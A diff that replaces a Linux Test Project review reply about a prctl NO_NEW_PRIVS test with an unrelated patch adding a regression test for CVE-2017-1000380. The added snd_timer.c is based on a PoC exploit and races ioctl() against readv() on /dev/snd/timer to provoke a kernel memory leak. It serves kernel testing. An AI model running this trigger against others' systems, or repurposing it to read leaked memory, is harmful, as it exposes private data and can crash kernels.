@@ -1,209 +1,226 @@
-From: Yang Xu <xuyang2018.jy@cn.fujitsu.com>
-Date: Fri, 14 Jun 2019 18:32:27 +0800
-Subject: [LTP] [PATCH] syscalls/prctl06.c: New test for prctl() with
- PR_{SET, GET}_NO_NEW_PRIVS
-In-Reply-To: <20190523115236.GD30616@rei.lan>
-References: <1557404498-3879-1-git-send-email-xuyang2018.jy@cn.fujitsu.com>
- <20190523115236.GD30616@rei.lan>
-Message-ID: <5D0377BB.1060605@cn.fujitsu.com>
+From: Michael Moese <mmoese@suse.de>
+Date: Fri, 14 Jun 2019 13:13:10 +0200
+Subject: [LTP] [PATCH] Add a regression test for CVE-2017-1000380
+Message-ID: <20190614111310.30548-1-mmoese@suse.de>
 List-Id: <ltp.lists.linux.it>
 MIME-Version: 1.0
 Content-Type: text/plain; charset="us-ascii"
 Content-Transfer-Encoding: 7bit
 To: ltp@lists.linux.it
 
-Hi Cyril
-   Sorry for the late reply.
+A race condition was present in the linux kernel, which could lead to
+a leak of arbitrary kernel memory to userspace applications.
 
-> Hi!
->> +#define IPC_ENV_VAR "LTP_IPC_PATH"
->> +
->> +static void check_no_new_privs(int val)
->> +{
->> +	TEST(prctl(PR_GET_NO_NEW_PRIVS, 0, 0, 0, 0));
->> +	if (TST_RET == val)
->> +		tst_res(TPASS,
->> +			"prctl(PR_GET_NO_NEW_PRIVS) got %d "
->> +			"when no_new_privs was %d", val, val);
->> +	else
->> +		tst_res(TFAIL | TTERRNO,
->> +			"prctl(PR_GET_NO_NEW_PRIVS) expected %d got %ld",
->> +			val, TST_RET);
->> +	return;
-> This return is useless.
-OK. I will remove it and add check for /proc/[pid]/status for NoNewPrivs.
+The issue was fixed in those kernel commits:
+ http://git.kernel.org/linus/d11662f4f798b50d8c8743f433842c3e40fe3378
+ http://git.kernel.org/linus/ba3021b2c79b2fa9114f92790a99deb27a65b728
 
->> +}
->> +
->> +static void do_prctl(void)
->> +{
->> +	char path[4096];
->> +	char ipc_env_var[1024];
->> +	char *const argv[] = {"prctl06_execve", "parent process", NULL};
->> +	char *const childargv[] = {"prctl06_execve", "child process", NULL};
->> +	char *const envp[] = {"LTP_TEST_ENV_VAR=test", ipc_env_var, NULL };
->> +	cap_t caps = cap_init();
->> +	cap_value_t capList = CAP_SETGID;
->> +	unsigned int num_caps = 1;
->> +	int childpid;
->> +
->> +	cap_set_flag(caps, CAP_EFFECTIVE, num_caps,&capList, CAP_SET);
->> +	cap_set_flag(caps, CAP_INHERITABLE, num_caps,&capList, CAP_SET);
->> +	cap_set_flag(caps, CAP_PERMITTED, num_caps,&capList, CAP_SET);
->> +
->> +	if (cap_set_proc(caps))
->> +		tst_brk(TFAIL | TERRNO,
->> +			"cap_set_flag(CAP_SETGID) failed");
-> You cannot use tst_brk with TFAIL, the best you can do here is to use
-> tst_ret(TFAIL ... ) then return; as you do below.
->
-I got it.
+This patch adds a regression test triggering this race condition.
 
->> +	tst_res(TINFO, "cap_set_flag(CAP_SETGID) succeeded");
->> +
->> +	check_no_new_privs(0);
->> +
->> +	TEST(prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0));
->> +	if (TST_RET == -1) {
->> +		tst_res(TFAIL | TTERRNO, "prctl(PR_SET_NO_NEW_PRIVS) failed");
->> +		return;
->> +	}
->> +	tst_res(TPASS, "prctl(PR_SET_NO_NEW_PRIVS) succeeded");
->> +
->> +	check_no_new_privs(1);
->> +
->> +	if (tst_get_path("prctl06_execve", path, sizeof(path)))
->> +		tst_brk(TCONF, "Couldn't find prctl_execve in $PATH");
-> If the path to the binary is in $PATH you don't have to execute the
-> binary by an absolute path, passing it's name to execve() should
-> suffice.
->
-  It sounds reasonable. I will pass binary_name directly.
+Signed-off-by: Michael Moese <mmoese@suse.de>
+---
+ runtest/cve                        |   1 +
+ testcases/kernel/Makefile          |   1 +
+ testcases/kernel/sound/.gitignore  |   1 +
+ testcases/kernel/sound/Makefile    |  12 ++++
+ testcases/kernel/sound/snd_timer.c | 137 +++++++++++++++++++++++++++++++++++++
+ 5 files changed, 152 insertions(+)
+ create mode 100644 testcases/kernel/sound/.gitignore
+ create mode 100644 testcases/kernel/sound/Makefile
+ create mode 100644 testcases/kernel/sound/snd_timer.c
 
->> +	sprintf(ipc_env_var, IPC_ENV_VAR "=%s", getenv(IPC_ENV_VAR));
->> +	childpid = SAFE_FORK();
->> +	if (childpid == 0) {
->> +		check_no_new_privs(1);
-> 		Maybe we can pass a "child" string here and "parent"
-> 		string in the cases above so that we can print if the
-> 		check was done in child/parent in the tst_res() inside
-> 		of this function.
->
-Ok. Pass a "child" or "parent" string can make it more clear for user.
-
->> +		execve(path, childargv, envp);
->> +		tst_brk(TFAIL | TERRNO,
->> +			"child process failed to execute prctl_execve");
->> +
->> +	} else {
->> +		tst_reap_children();
->> +		execve(path, argv, envp);
->> +		tst_brk(TFAIL | TERRNO,
->> +			"parent process failed to execute prctl_execve");
->> +	}
->> +	cap_free(caps);
->> +	return;
->> +}
->> +
->> +static void verify_prctl(void)
->> +{
->> +	int pid;
->> +
->> +	pid = SAFE_FORK();
->> +	if (pid == 0) {
->> +		do_prctl();
->> +		exit(0);
->> +	}
->> +	tst_reap_children();
->> +	return;
->> +}
->> +
->> +static struct tst_test test = {
->> +	.test_all = verify_prctl,
->> +	.forks_child = 1,
->> +	.needs_root = 1,
->> +	.child_needs_reinit = 1,
->> +};
->> diff --git a/testcases/kernel/syscalls/prctl/prctl06_execve.c b/testcases/kernel/syscalls/prctl/prctl06_execve.c
->> new file mode 100644
->> index 000000000..84c28551c
->> --- /dev/null
->> +++ b/testcases/kernel/syscalls/prctl/prctl06_execve.c
->> @@ -0,0 +1,46 @@
->> +// SPDX-License-Identifier: GPL-2.0-or-later
->> +/*
->> + * Copyright (c) 2019 FUJITSU LIMITED. All rights reserved.
->> + * Author: Yang Xu<xuyang2018.jy@cn.fujitsu.com>
->> + *
->> + * dummy program which is used by prctl06 testcase
->> + */
->> +#define TST_NO_DEFAULT_MAIN
->> +#include<stdlib.h>
->> +#include<sys/types.h>
->> +#include<unistd.h>
->> +#include<errno.h>
->> +#include<pwd.h>
->> +#include "tst_test.h"
->> +
->> +int main(int argc, char **argv)
->> +{
->> +	struct passwd *pw;
->> +	uid_t nobody_uid;
->> +	gid_t nobody_gid;
->> +
->> +	tst_reinit();
->> +	if (argc != 2)
->> +		tst_brk(TFAIL, "argc is %d, expected 2", argc);
->> +
->> +	pw = SAFE_GETPWNAM("nobody");
->> +	nobody_uid = pw->pw_uid;
->> +	nobody_gid = pw->pw_gid;
->> +	/*positive check*/
->> +	TEST(setgid(nobody_gid));
->> +	if (TST_RET == -1)
->> +		tst_res(TFAIL | TTERRNO,
->> +			"%s setgid(%d) isn't permmit", argv[1], nobody_gid);
->> +	else
->> +		tst_res(TPASS, "%s setgid(%d) succeed expectedly",
->> +			argv[1], nobody_gid);
->> +	/*negative check*/
->> +	TEST(setuid(nobody_uid));
->> +	if (TST_RET == -1)
->> +		tst_res(TPASS | TTERRNO,
->> +			"%s setuid(%d) isn't permmit", argv[1], nobody_uid);
->> +	else
->> +		tst_res(TFAIL, " %s setuid(%d) succeed unexpectedly",
->> +			argv[1], nobody_gid);
->> +	return 0;
->> +}
-> I do not think that this is actually testing the prctl in question. Here
-> we actually check that capabilities were inherited over fork() + exec().
->
-> As far as I understand the PR_SET_NO_NEW_PRIVS it has been designed
-> expecially to avoid misuse of capabilities associated with a particular
-> file.
->
-> So the check would have to do:
->
-> 1. copy the prctl06_execve binary to a $PWD
-> 2. chmod it with S_ISUID, S_ISGID
-> 3. the prct06_execve would be executed under user/group nobody
-> 4. the prct06_execve itself would check if it gained root priviledges
->
-I have seen documention about PR_SET_NO_NEW_PRIVS.  I think your way is right. But I have reset this capabilities
-and only keep CAP_SETGID, so when I set no_new_privs to 1, prctl06_execve inherits CAP_SETGID but not gain CAP_SETUID.
-
-
-> And we can do the same for capablities as well.
->
-> I guess that we would have to format a device and mount it with support
-> for capabilities for the test, since as far as I can tell you cannot
-> usually do neither of set-usr-id or add capabilites to files in /tmp/.
-Yes. In /tmp, these make no sense. I will follow by your advise.
-
-Thanks
-Yang Xu
-
-
-
+diff --git a/runtest/cve b/runtest/cve
+index 031bcdc2a..01324c6ce 100644
+--- a/runtest/cve
++++ b/runtest/cve
+@@ -36,6 +36,7 @@ cve-2017-17052 cve-2017-17052
+ cve-2017-16939 cve-2017-16939
+ cve-2017-17053 cve-2017-17053
+ cve-2017-18075 pcrypt_aead01
++cve-2017-1000380 snd_timer
+ cve-2018-5803 sctp_big_chunk
+ cve-2018-1000001 realpath01
+ cve-2018-19854 crypto_user01
+diff --git a/testcases/kernel/Makefile b/testcases/kernel/Makefile
+index 39d79c7d8..eff5b3e7d 100644
+--- a/testcases/kernel/Makefile
++++ b/testcases/kernel/Makefile
+@@ -52,6 +52,7 @@ SUBDIRS			+= connectors \
+ 			   pty \
+ 			   sched \
+ 			   security \
++			   sound \
+ 			   timers \
+ 			   tracing \
+ 
+diff --git a/testcases/kernel/sound/.gitignore b/testcases/kernel/sound/.gitignore
+new file mode 100644
+index 000000000..57eae0593
+--- /dev/null
++++ b/testcases/kernel/sound/.gitignore
+@@ -0,0 +1 @@
++snd_timer
+diff --git a/testcases/kernel/sound/Makefile b/testcases/kernel/sound/Makefile
+new file mode 100644
+index 000000000..5fdc7dd42
+--- /dev/null
++++ b/testcases/kernel/sound/Makefile
+@@ -0,0 +1,12 @@
++# SPDX-License-Identifier: GPL-2.0-or-later
++
++top_srcdir		:= ../../..
++
++include $(top_srcdir)/include/mk/testcases.mk
++
++CPPFLAGS		+= -D_GNU_SOURCE
++
++LDLIBS 			+= -pthread
++
++
++include $(top_srcdir)/include/mk/generic_leaf_target.mk
+diff --git a/testcases/kernel/sound/snd_timer.c b/testcases/kernel/sound/snd_timer.c
+new file mode 100644
+index 000000000..2d719fc03
+--- /dev/null
++++ b/testcases/kernel/sound/snd_timer.c
+@@ -0,0 +1,137 @@
++// SPDX-License-Identifier: GPL-2.0-or-later
++
++/* Copyright (c) 2019 Michael Moese <mmoese@suse.com>
++ * Regression test for CVE-2017-1000380 based on the original PoC exploit
++ * by Alexander Potapenko <glider@google.com>
++ *
++ * Be careful! This test may crash your kernel!
++ *
++ * The test performs several ioctl() parallel with readv() on the same
++ * file descriptor to /dev/snd/timer. A buggy kernel will leak memory
++ * to the process, which may contain information from the the kernel or
++ * any other process on the system.
++ *
++ * The issue was fixed with
++ *   http://git.kernel.org/linus/d11662f4f798b50d8c8743f433842c3e40fe3378
++ *   http://git.kernel.org/linus/ba3021b2c79b2fa9114f92790a99deb27a65b728
++ */
++
++#include "config.h"
++#include "tst_test.h"
++#include "tst_taint.h"
++#include "tst_fuzzy_sync.h"
++#include "tst_safe_macros.h"
++#include "tst_safe_pthread.h"
++
++#include <errno.h>
++#include <fcntl.h>
++#include <pthread.h>
++#include <stdio.h>
++#include <string.h>
++#include <sys/uio.h>
++#include <sys/ioctl.h>
++#include <sound/asound.h>
++
++#define MAX_BUFSIZE 1024
++
++static int snd_fd;
++static struct tst_fzsync_pair fzsync_pair;
++
++static void *ioctl_thread(void *unused)
++{
++	(void) unused;
++	int tread_arg = 1;
++	struct snd_timer_select ts;
++	struct snd_timer_params tp;
++
++	while (tst_fzsync_run_b(&fzsync_pair)) {
++
++		ioctl(snd_fd, SNDRV_TIMER_IOCTL_TREAD, &tread_arg);
++
++		memset(&ts, 0, sizeof(ts));
++		ts.id.dev_class = 1;
++		ioctl(snd_fd, SNDRV_TIMER_IOCTL_SELECT, &ts);
++
++		memset(&tp, 0, sizeof(tp));
++		tp.ticks = 1;
++		tp.filter = 0xf;
++		ioctl(snd_fd, SNDRV_TIMER_IOCTL_PARAMS, &tp);
++
++		ioctl(snd_fd, SNDRV_TIMER_IOCTL_START, 0);
++
++		tst_fzsync_end_race_b(&fzsync_pair);
++	}
++	return NULL;
++}
++
++static void setup(void)
++{
++	tst_fzsync_pair_init(&fzsync_pair);
++	tst_taint_init(TST_TAINT_W | TST_TAINT_D);
++	snd_fd = SAFE_OPEN("/dev/snd/timer",
++			O_RDONLY|O_CREAT|O_NOCTTY|O_SYNC|O_LARGEFILE, 0);
++}
++
++static void cleanup(void)
++{
++	tst_fzsync_pair_cleanup(&fzsync_pair);
++	SAFE_CLOSE(snd_fd);
++}
++
++static void run(void)
++{
++	size_t len;
++	int size;
++	struct iovec iov;
++	pthread_t th;
++	char read_buf[MAX_BUFSIZE];
++	int i, nz = 0;
++	pthread_attr_t thread_attr;
++
++	pthread_attr_init(&thread_attr);
++	pthread_attr_setdetachstate(&thread_attr, PTHREAD_CREATE_DETACHED);
++	SAFE_PTHREAD_CREATE(&th, &thread_attr, ioctl_thread, NULL);
++
++	iov.iov_base = read_buf;
++	iov.iov_len = sizeof(read_buf);
++
++	while (tst_fzsync_run_a(&fzsync_pair)) {
++		memset(read_buf, 0, sizeof(read_buf));
++		size = readv(snd_fd, &iov, 1);
++
++		tst_fzsync_end_race_a(&fzsync_pair);
++
++		/* check if it could be a valid ioctl result */
++		if (size == 0)
++			continue;
++
++		/* check if the buffer is  */
++		for (i = 0; i < size; i++) {
++			if (read_buf[i]) {
++				nz = 1;
++				break;
++			}
++		}
++		if (!nz)
++			continue;
++
++		len = strlen(read_buf);
++		/* the kernel's struct snd_timer_read is two unsigned integers*/
++		if (len <= 2 * sizeof(unsigned int))
++			continue;
++
++		tst_res(TFAIL, "kernel seems vulnerable");
++		return;
++	}
++
++	if (tst_taint_check() != 0)
++		tst_res(TFAIL, "kernel seems vulnerable");
++	else
++		tst_res(TPASS, "kernel seems not vulnerable");
++}
++
++static struct tst_test test = {
++	.test_all = run,
++	.setup = setup,
++	.cleanup = cleanup,
++};
+-- 
+2.16.4
 
